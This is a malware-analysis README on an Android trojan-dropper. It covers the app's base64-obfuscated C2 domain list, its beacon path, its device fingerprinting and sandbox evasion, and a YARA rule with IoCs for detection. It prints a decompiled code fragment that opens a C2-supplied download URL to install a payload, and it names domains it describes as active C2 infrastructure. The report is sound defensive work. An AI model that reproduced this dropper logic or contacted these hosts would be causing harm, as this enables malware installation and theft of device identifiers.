# Technical Analysis: NetMirror Android Dropper (`app.netmirror.netmirrornew`)

## Executive Summary

This repository contains a comprehensive threat intelligence teardown of an active Android spyware campaign operating via the application package `app.netmirror.netmirrornew`. 

The application functions primarily as a **Trojan-Dropper / Drive-By Downloader**. It leverages cross-platform deployment frameworks, anti-analysis checks, and obfuscated Command and Control (C2) infrastructure to circumvent automated application ecosystem security controls, perform deep hardware fingerprinting, and forcibly push malicious external packages onto targeted mobile devices.

---

## Technical Triage & Decompilation Workflow

Automated mobile analysis tools (such as native JADX configurations) failed to properly parse the underlying application core due to a deliberately corrupted `AndroidManifest.xml` layout designed by the threat actors to induce parser crashes during static ingestion.

To bypass this evasion hurdle, a manual triage pipeline was executed:

1. **Manifest Recovery:** The resource tables were dynamically unpacked to isolate the core execution assets.
2. **Bytecode Extraction:** The application logic was identified as pre-compiled **Meta Hermes JavaScript Bytecode**, noted by repetitive `LŠ` structural byte sequences.
3. **Decompilation:** The binary bytecode was successfully translated back into readable source code via the open-source `hermes-dec` utility on a local Windows terminal environment.

### AI-Accelerated Ingestion (Methodology Transparency)

The resulting decompiled asset (`readable_code.js`) yielded a massive footprint of **258,788 lines of code (~9.3 MB)** consisting of standard React Native core modules intertwined with specialized developer modifications. 

To achieve maximum time-efficiency during analysis, the raw decompiled text layer was triaged using a **Large Language Model (LLM)**. The AI acted as a force multiplier, quickly filtering out safe, native framework code blocks to isolate the obfuscated telemetry parameters, specific function hashes, and structural overrides outlined below.

---

## Critical Findings & Capabilities

### 1. Obfuscated Command & Control (C2) Failover Arrays

At line **210363**, the source code uses a static array containing **23 Base64-encoded strings** representing live external connection domains. The app sequentially loops through this infrastructure array to establish persistent HTTP/HTTPS connectivity:

* `https://mobiledetect.app`
* `https://mobidetect.art`
* `https://mobidetect.cc`
* `https://mobidetect.click`
* `https://mobidetect.ink`
* `https://mobidetect.live`
* `https://mobidetect.pro`
* `https://mobidetect.shop`
* `https://mobidetect.site`
* `https://mobidetect.space`
* `https://mobidetect.store`
* `https://mobidetect.vip`
* `https://mobidetect.wiki`
* `https://mobidetect.xyz`
* `https://mobidetects.art`
* `https://mobidetects.cc`
* `https://mobidetects.info`
* `https://mobidetects.ink`
* **`https://mobidetects.live`** (Verified active command link)
* `https://mobidetects.pro`
* `https://mobidetects.store`
* `https://mobidetects.top`
* `https://mobidetects.xyz`

The app targets the path `/check.php` (hidden as `L2NoZWNrLnBocA==` in Base64) to transmit initial beacons.

### 2. User-Agent Injection & Client Fingerprinting

To obscure tracking traffic from network defense filters, the application injects a custom signature suffix (` /OS.Gatu v3.0`) into the native system User-Agent string during background data transmissions. 

### 3. Dynamic Drive-By Downloader Pipeline

When an active C2 server responds to the `check.php` request, it transmits a dynamic data array known in the codebase as `stape`. The application carries out the following automated sequence:

1. Performs an unsolicited background `GET` request to every link provided in `stape`.
2. Automatically scrapes the server responses and sends the remote text frames back to the C2 API via a `POST` query.
3. Parses a final target file download link (`dlUrl`) and triggers a built-in native **1-second delay execution loop**:

```javascript
r8 = r7.setTimeout;
r7 = function() {
    r2 = r0.Linking;
    r1 = r2.openURL;
    r0 = r0.data.dlUrl;
    r0 = r1.bind(r2)(r0); // Triggers browser redirect / APK installer payload download
};
```

### 4. Deep Device Exfiltration & Sandbox Evasion

The application integrates native hardware instrumentation structures to capture persistent identifiers and cross-check runtime states:

* **`isEmulatorSync` / `isEmulator`:** Used as an anti-analysis mechanism to halt execution if a virtual sandbox environment is detected.
* **Persistent Hardware Theft:** Collects and transmits the user's permanent `getMacAddress`, persistent `getUniqueId` UUID, and specific underlying system OS `getFingerprint` values.

---

## Defensive Detection Signatures

### YARA Rule

```yara
rule Android_NetMirror_Spyware_Dropper {
    meta:
        description = "Detects NetMirror React Native C2 infrastructure and obfuscated payload droppers"
        threat_level = "High"
        capabilities = "Trojan-Dropper, Drive-By Downloader, Device-Fingerprinting"

    strings:
        // Core C2 Domain Indicators discovered during analysis
        $c2_domain_1 = "mobidetects.live" ascii wide
        $c2_domain_2 = "mobiledetect.app" ascii wide
        
        // Obfuscated tracking path query
        $check_path = "/check.php" ascii wide
        
        // Threat actor's custom User-Agent signature
        $user_agent = "/OS.Gatu v3.0" ascii wide
        
        // Exploited high-risk manifest permission handler
        $perm_write = "android.permission.WRITE_SETTINGS" ascii wide

    condition:
        $perm_write and ($user_agent or any of ($c2_domain_*)) and $check_path
}
```

---

## Indicators of Compromise (IoCs)

### Network Domains (C2)

```text
mobiledetect.app
mobidetect.art
mobidetect.cc
mobidetect.click
mobidetect.ink
mobidetect.live
mobidetect.pro
mobidetect.shop
mobidetect.site
mobidetect.space
mobidetect.store
mobidetect.vip
mobidetect.wiki
mobidetect.xyz
mobidetects.art
mobidetects.cc
mobidetects.info
mobidetects.ink
mobidetects.live
mobidetects.pro
mobidetects.store
mobidetects.top
mobidetects.xyz
```

### Network Signatures

* **User-Agent String Profile:** Contains matching regex pattern `.* /OS.Gatu v3.0`
* **Target URI Ingestion:** Outbound POST requests pointing toward `*/check.php`

---

## Disclaimer

> [!WARNING]  
> **Educational and Defensive Purposes Only**  
> The information, analysis, and Indicators of Compromise (IoCs) provided in this repository are published strictly for educational, defensive, and threat intelligence tracking purposes. 
> 
> The domains listed in this report are associated with active malware command-and-control infrastructure. **Do not visit, interact with, or attempt to connect to these domains.** The author is not responsible for any misuse of this information or any damage caused by interacting with the documented threat infrastructure.
```
